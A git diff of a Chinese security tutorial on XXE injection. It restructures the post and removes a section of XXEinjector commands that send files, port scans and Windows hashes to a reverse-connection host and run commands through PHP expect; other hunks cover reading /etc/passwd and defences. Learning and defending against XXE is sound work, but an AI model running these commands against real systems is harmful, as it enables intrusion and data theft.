@@ -1,9 +1,12 @@
 ---
-title: XXE注入漏洞
+title: XML实体注入漏洞
+date: 2020-1-22 20:09:00
 ---
-# XXE注入漏洞
+## XML外部实体注入
 
-# XXE是什么？
+当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害
+
+**注意：**执行系统命令(安装expect扩展的PHP环境里才有)
 
 ## XML基础
 
@@ -63,12 +66,6 @@ XML解析器通常会解析XML文档中所有的文本
 <!ENTITY 实体名称 PUBLIC “public_ID" “URI">
 ```
 
-## XML外部实体注入
-
-当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。
-
-**注意：**执行系统命令(安装expect扩展的PHP环境里才有)
-
 ## 恶意引入外部实体的三种方式
 
 #### 一、本地引入
@@ -114,13 +111,13 @@ DTD文件(evil.dtd)内容：
 
 另外，不同程序支持的协议不一样
 
- ![](/post-pic/xxe/xml1.png) 
+ ![](/images/xml1.png) 
 
  上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有
 
- ![](/post-pic/xxe/xml2.png) 
+ ![](/images/xml2.png) 
 
-# 发现XXE漏洞
+## 发现XXE漏洞
 
 寻找那些接受XML作为输入内容的端点。 
 
@@ -130,17 +127,17 @@ DTD文件(evil.dtd)内容：
 
 请求：
 
-![request](/post-pic/xxe/xmlr1.png)
+![request](/images/xmlr1.png)
 
 响应：
 
-![Response](/post-pic/xxe/xmlp1.png)
+![Response](/images/xmlp1.png)
 
 应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户
 
 修改请求的XML内容，重放
 
-![](/post-pic/xxe/xmlre1.png)
+![](/images/xmlre1.png)
 
 我们在上面的请求中定义了一个名为wintrysec，值为 'wintrysec666' 的实体
 
@@ -162,9 +159,9 @@ DTD文件(evil.dtd)内容：
 
 重放， 成功读取`/etc/passwd`文件 
 
- ![](/post-pic/xxe/xmlre2.png) 
+ ![](/images/xmlre2.png) 
 
-# 防御XXE攻击
+## 防御XXE攻击
 
 #### **一、过滤用户提交的XML数据**
 
@@ -194,54 +191,3 @@ Python：
 from lxml import etree
 xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
 ```
-
-# 自动化XXE工具
-
-[XXEinjector](https://github.com/enjoiz/XXEinjector )是一个使用Ruby编写的自动化xxe漏洞检测工具，
-
-可以通过给定一个http请求的包，然后设置好好参数就会自动化的进行fuzz，
-
-他会通过内置的规则进行自动化的测试，并且还支持二次注入（通过另一个请求触发漏洞）
-
-#### **参数说明：**
-
-- host: 用于反向连接的 IP
-- path: 要读取的文件或目录
-- file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置
-- proxy: 代理服务器
-- oob：使用的协议，支持 http/ftp/gopher
-- phpfilter：使用 PHP filter 对要读取的内容进行 base64 编码，解决传输文件内容时的编码问题
-
-#### **使用方法：**
-
-```ruby
-#列 /etc 目录 通过https:
-ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
-#二次注入:
-ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt 
-#通过http协议暴力枚举文件:
-ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
-#直接枚举:
-ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
-```
-
-```ruby
-#枚举所有端口:
-ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
-
-#获取windows hash:
-ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
-
-#通过java的jar上传文件:
-ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
-
-#执行系统命令使用 PHP expect:
-ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
-
-#测试XSLT注入:
-ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
-
-#记录请求日志:
-ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
-```
-
